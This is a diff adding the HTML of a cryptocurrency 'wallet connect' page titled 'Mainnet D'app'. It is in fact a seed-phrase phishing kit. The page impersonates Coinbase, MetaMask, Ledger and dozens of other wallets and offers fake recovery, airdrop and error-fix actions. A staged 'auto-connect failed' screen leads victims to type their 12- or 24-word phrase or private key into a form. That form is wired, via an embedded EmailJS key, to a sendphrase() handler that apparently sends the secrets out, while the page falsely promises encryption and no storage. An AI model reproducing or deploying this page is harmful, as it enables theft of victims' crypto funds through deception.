@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link
+    href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css"
+    rel="stylesheet"/>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+      emailjs.init("flkfCtdEYIz09YU7m");
+    })();
+    </script>
+    <script src="script.js"></script>
+    <title>Mainnet D'app</title>
+</head>
+<body>
+    <section class="fixedbox1">
+        <div class="fixedbox1content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i class="ri-close-large-line"></i>
+            </div>
+            <div id="fixedbox1logo" class="fixedlogobox">
+                <img id="coinbaseboximage" src="img/coinbase.jpeg" alt="">
+                <h4>Coinbase</h4>
+                <h5>Fast, Simple, Secure.</h5>
+            </div>
+            <div class="walletsbox">
+                <div class="walletsboxcontent">
+                    <img src="img/trustwallet.png" alt="">
+                    <h5>Trust Wallet</h5>
+                </div>
+                <div class="walletsboxcontent">
+                    <img src="img/phantom.png" alt="">
+                    <h5>Phantom</h5>
+                </div>
+                <div class="walletsboxcontent">
+                    <img src="img/okx.jpeg" alt="">
+                    <h5>OKX</h5>
+                </div>
+                <div class="walletsboxcontent">
+                    <img src="img/others.png" alt="">
+                    <h5>All Wallets</h5>
+                </div>
+            </div>
+
+        </div>
+        <div class="fixedbox2content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i class="ri-close-large-line"></i>
+            </div>
+            <div class="fixedlogobox">
+                <img id="loadingboxlogo" src="img/coinbase.jpeg" alt="">
+                <h4 id="loadingboxtext">Coinbase</h4>
+            </div>
+            <div class="loadingcircle">
+                
+            </div>
+        </div>
+        <div class="fixedbox3content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i class="ri-close-large-line"></i>
+            </div>
+            <div id="coinbasebox" class="fixedlogobox">
+                <img id="fixedbox3contentlogo" src="img/coinbase.jpeg" alt="">
+                <h4 id="fixedbox3contenttext">Coinbase</h4>
+            </div>
+
+            <div class="exclamation">
+                !
+            </div>
+            <h4>Auto-connect failed. <br>Retry auto-connect or connect manually</h4>
+            <div class="fixedbox3butttons">
+                <button onclick="reload()">Retry Auto-connect</button>
+                <button onclick="manualconnect()">Connect Manually</button>
+            </div>
+        </div>
+        <div class="fixedbox4content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i class="ri-close-large-line"></i>
+            </div>
+            <div class="fixedbox4logo">
+                <img id="fixedbox4logo" src="img/coinbase.jpeg" alt="">
+                <h4 id="fixedbox4text">Coinbase</h4>
+            </div>
+            <select name="" id="" class="phrasetype">
+                <option value="">12-word Phrase</option>
+                <option value="">24-word Phrase</option>
+                <option value="">Private Key</option>
+            </select>
+            <textarea id="phrasebox" class="phrasebox" placeholder="Separate each word with spaces. No numbers or special characters are allowed" id=""></textarea>
+            <h5 class="phrasesecure">Your details remain remain fully under our control and are never stored on our server.</h5>
+            <button onclick="sendphrase()" class="connectwallet">Connect Wallet</button>
+            <h5 class="securetext">This section is secured by end to end encryption🔒</h5>
+        </div>
+        <div class="fixedbox5content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i class="ri-close-large-line"></i>
+            </div>
+            <div class="inputbox"><i class="ri-search-2-line"></i><input placeholder="Search Wallet" type="text" class="searchbar"></div>
+            <div class="logosbox">
+                <div class="walletlogo">
+                    <img src="img/1inch.png" alt="">
+                    
+                    1inch...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/argent.png" alt="">
+                    Argen...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/atomic.png" alt="">
+                    Atomi...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/best.png" alt="">
+                    Best ...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/bitcoincom.png" alt="">
+                    Bitco...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/blockchain.png" alt="">
+                    Block...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/BRD.png" alt="">
+                    BRD
+                </div>
+                <div class="walletlogo">
+                    <img src="img/cryptocom.png" alt="">
+                    Crypt...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/exodus.png" alt="">
+                    Exodu...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/here.png" alt="">
+                    Here ...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/imtoken.png" alt="">
+                    imTok...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/klever.png" alt="">
+                    Kleve...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/kraken.png" alt="">
+                    Krake...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/leap.png" alt="">
+                    Leap ...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/ledger.png" alt="">
+                    Ledge...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/magic eden.png" alt="">
+                    Magic...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/metamask.png" alt="">
+                    Meta ...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/pera.png" alt="">
+                    Pera ...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/rainbow2.png" alt="">
+                    Rainb...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/robinhood.png" alt="">
+                    Robin...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/safepal.png" alt="">
+                    Safep...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/solflare.png" alt="">
+                    Solfl...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/terra.png" alt="">
+                    Terra...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/tonkeeper.png" alt="">
+                    Tonke...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/venom.png" alt="">
+                    Veno...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/xaman.png" alt="">
+                    Xama...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/zerion.png" alt="">
+                    Zerio...
+                </div>
+                <div class="walletlogo">
+                    <img src="img/others.png" alt="">
+                    Other
+                </div>
+            </div>
+        </div>
+        <div class="fixedbox6content">
+            <div class="connectbox">
+                <h4>Connect Wallet</h4>
+                <i id="closeresponse" class="ri-close-large-line"></i>
+            </div>
+            <img src="img/adminbar.fw.png" alt="">
+            <div class="exclamation">
+                !
+            </div>
+            <h2 class="connectresponse">Invalid wallet/Wallet volume below minimum</h2>
+            
+        </div>
+    </section>
+    <section class="section1">
+        <div class="navigationbox">
+            <nav class="navigation">
+                <div class="logotext">Project<span class="sublogotext">MainnetDapp</span></div>
+                <div class="subnavigation">
+                    <h3 class="homeh3">Home</h3>
+                    <h3 id="connecth3" class="connecth3">Connect</h3>
+                </div>
+                <div class="menubox">
+                    <i class="ri-menu-2-line"></i>
+                </div>     
+            </nav>
+            
+            <h4 class="hiddenhome">Home</h4>
+            <h4 class="hiddenconnect">Connect</h4>
+        </div>
+        <div class="section1content">
+            <div class="leftcontent">
+                <h3>Web3 Connection Made Easy</h3>
+                <h4>The communication protocol for web3. <br>Project Mainnet Dapp brings the ecosystem together by enabling wallets and apps to securely connect and interact.</h4>
+                <button onclick="openfixed()">Synchronise Wallet</button>
+            </div>
+            <div class="rightcontent">
+                <img src="img/sync.jpg.webp" alt="">
+            </div>
+        </div>   
+    </section>
+    <section class="section2">
+        <h1 class="secondsectionheader">Select One of the Actions Below</h1>
+        <div class="actionsbox">
+            <div class="actions">
+                    <div class="ri-token-swap-fill"></div>
+                    <h3>MIGRATION</h3>
+                    <h4>Click here for Migration</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-gift-2-fill"></div>
+                    <h3>CLAIM REWARDS</h3>
+                    <h4>Click here to claim assets</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-exchange-dollar-line"></div>
+                    <h3>SWAP</h3>
+                    <h4>Click here for asset swapping</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-percent-fill"></div>
+                    <h3>SLIPPAGE</h3>
+                    <h4>Click here for slippage related errors</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-exchange-funds-line"></div>
+                    <h3>TRANSACTION</h3>
+                    <h4>Click here for transaction related errors</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-exchange-box-fill"></div>
+                    <h3>CROSS TRANSFER</h3>
+                    <h4>Click here for cross bridge issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-money-dollar-circle-fill"></div>
+                    <h3>STAKING</h3>
+                    <h4>Click here for staking related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-exchange-dollar-line"></div>
+                    <h3>EXCHANGE</h3>
+                    <h4>Click here for exchange related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-link"></div>
+                    <h3>CONNECT TO DAPPS</h3>
+                    <h4>Click here for errors while connecting to dapps</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-login-box-line"></div>
+                    <h3>LOGIN</h3>
+                    <h4>Click here for wallet login issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-file-list-3-line"></div>
+                    <h3>WHITELIST</h3>
+                    <h4>Click here for whitelist related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                    <div class="ri-device-recover-fill"></div>
+                    <h3>RECOVERY</h3>
+                    <h4>Click here for wallet recovery</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div id="error" class="ri-error-warning-fill"></div>
+                    <h3>MISSING/IRREGULAR BALANCE</h3>
+                    <h4>Click here to recover lost/missiing funds</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-error-warning-fill"></div>
+                    <h3 id="walletglitch">WALLET GLITCH/WALLET ERROR</h3>
+                    <h4>Click here if you have issues with your trading wallet</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-loader-2-fill"></div>
+                    <h3>TRANSACTION DELAY</h3>
+                    <h4>Click here for any transaction delay or related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-gift-fill"></div>
+                    <h3>CLAIM AIRDROP</h3>
+                    <h4>Click here for airdrop related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-nft-fill"></div>
+                    <h3>NFTs</h3>
+                    <h4>Click here for NFT minting/transfer related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+            <div class="actions">
+                <div class="ri-lock-2-fill"></div>
+                    <h3>LOCKED ACCOUNT</h3>
+                    <h4>Click here to resolve locked account and related issues</h4>
+                    <button onclick="openfixed()">Select</button>
+            </div>
+        </div>
+        
+    </section>
+
+    <script src="function.js"></script>
+</body>
+</html>
+
+<!-- 
